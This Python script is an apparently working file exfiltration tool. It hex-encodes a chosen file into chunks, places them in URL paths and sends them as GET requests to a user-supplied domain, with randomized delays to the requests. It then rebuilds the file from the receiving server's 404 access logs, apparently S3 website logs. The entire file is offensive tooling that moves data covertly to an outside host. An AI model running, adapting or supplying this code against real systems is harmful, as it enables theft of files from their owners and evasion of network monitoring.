import requests, time, math, random, os.path
import Common as Common 
from textwrap import wrap
from progressbar import ProgressBar

# aws s3 cp --recursive s3://logstest322 U:/temp
URLlenght = 500
Delay = 0

def file_to_url_list(fileLocation,domain):
    fileContent = Common.open_file_bin_array(fileLocation) 
    hexArray = Common.bin_array_to_hex_array(fileContent)
    #calculates the number of ULRs needed to send all of the file content
    numOfURLs = math.ceil(len(hexArray)/URLlenght)
    fileNameHex = Common.encode_into_MAC(fileLocation.encode("ascii")) 
    URLsSend = [domain + "/n/" + ".".join(fileNameHex)]
    i = 0 
    while i < numOfURLs:
        URLsSend.append(domain +"/" + str(i) + "/" + "".join(hexArray[i*URLlenght:(i+1)*URLlenght]))
        i += 1
    print("URLs to be sent: " + str(len(URLsSend)))
    return URLsSend
    
def test_domain(domain):
    try:
        r = requests.get(domain)
        status = r.status_code         
    except:
        status = "Connection error has occured"
    if status == 200:
        print("Domain reachable")
        return True
    else:
        print("Error code: " + str(status))     
    return False
        
def user_domain_sanitization(domain):
    if "www." in domain:
        domain = domain.replace('www.', '', 1)
     
    if "http://" in domain:
        domain = domain
    elif "https://" in domain:
        print("https")
        domain = domain.replace('s', '', 1) 
    else:
        if "//" in domain:
            cutfrom = domain.find("//")
            domain = domain[cutfrom + 2 :]
        domain = "http://" + domain              
    return domain
        
    
def user_inputs_mode_1():
    global Delay
    domain = input("Enter the target domain : ")
    domain = user_domain_sanitization(domain)
    while not test_domain(domain):
        domain = input("Re-enter the target domain : ")
        domain = user_domain_sanitization(domain)
    fileToExfiltrate = input("Enter file to exfiltrate: ")
    while not Common.ValidFileName(fileToExfiltrate):
        fileToExfiltrate =  input("File name entered is invalid \n Enter file location: ")
        
    Delay = Common.get_speed_from_user()
    
    return domain, fileToExfiltrate

def user_input_mode_2():
    
    logFile = input("Enete log file location: ")
    while not Common.ValidFileName(logFile):
        logFile =  input("file name invalied\nEnter log file location: ")     
    
    IPaddress = input("Enter the public IP address of the sending computer: ")
    
    return logFile, IPaddress


def user_inputs_mode_3():
    directory = input("Enete log directory location to concatiante: ")
    while not os.path.isdir(directory):
        directory = input("Not a valid directory \nRe-enter directory : ")
    
    logOutput = input("enter the output location for the concatenated log: ")
    return directory, logOutput


def send_get_requests(URLs):
    global Delay
    pbar = ProgressBar()
    for URL in pbar(URLs):
        delayDuration = random.random() * Delay
        time.sleep(delayDuration)        
        r = requests.get(URL)
        if  not r.status_code == 404:
            print(r.status_code)
            
        

      
      
def read_log_file(logFileLocation, IPaddress):
    logFile = Common.importFile(logFileLocation)
    logFileClean = []
    # clean out the array
    for line in logFile:
        cutfrom = line.find("]")
        line = line[cutfrom + 1:]
        if not line == "\n":
            logFileClean.append(line.strip())
    # remove all logs for not the sendrs IP address
    # reseting the logFile variable to use as intermitent hold betwen stages of removal
    logFile = []
    for log in logFileClean:
        if log.find(IPaddress) == 0:
            logFile.append(log)
    # now only shows 404 errors
    logFile404 = []
    for log in logFile:
        if log.find(" 404 ") > 0:
            logFile404.append(log)
    # strip the logs for only the URL
    URLArray = []
    for log in logFile404:
        offset = log.find("WEBSITE.GET.OBJECT ")
        if offset >= 0:  
            log = log[offset+ 18:].strip()
            URL = log.split(" " , 1)[0]
            URLArray.append(URL) 
        
    URLArray = list(dict.fromkeys(URLArray))
    return URLArray

def decode_bin_array_to_file_name(binArray):
    output = ""
    for char in binArray:
        output += chr(int(char,2))
    return output   

def URL_array_to_file(URLArray):
    filename = []
    output = [""] * len(URLArray) 
    for URL in URLArray:
        info = URL.split("/")
        if len(info) == 2:
            if info[0] =="n":
                filename += info[1].split(".")
                # removes the last element that the n would take
                output.pop()
            else:
                # places the information into the array acording to the part number included in the URL
                output[int(info[0])] = info[1]
            
    
    # decod file name
    encodedFileName = Common.decode_MAC_array(filename)
    fileName = decode_bin_array_to_file_name(encodedFileName)
    outputFileName = Common.dose_file_already_exsist(fileName)
    hexArray = wrap("".join(output), 2)
    Common.hexArrayToFile(hexArray, outputFileName)
    print("The File has been outputed to: "+ outputFileName)


def main():
    run = True
    while run: 
        mode = input("Select mode \n 1: Send \n 2: decode \n 3: concatinate file \n " )
        if mode == "1":
            domain, fileName = user_inputs_mode_1()
            URLs = file_to_url_list(fileName,domain)
            send_get_requests(URLs)
            print("Done sending URLs")
            run = False
            
        elif mode == "2":
            logFile, IPaddress = user_input_mode_2()
            URLArray = read_log_file(logFile, IPaddress)
            URL_array_to_file(URLArray)
            run = False
        
        elif mode == "3":
            
            directory, logOutput = user_inputs_mode_3()
            Common.concatinate_files_in_dir(directory, logOutput)
            print("The File has been outputed to " + logOutput)
            run = False
            
        else:
            print("No option selected")
            mode = input("Select mode \n 1: Send \n 2: decode \n 3: concatinate file \n " )
    
   

    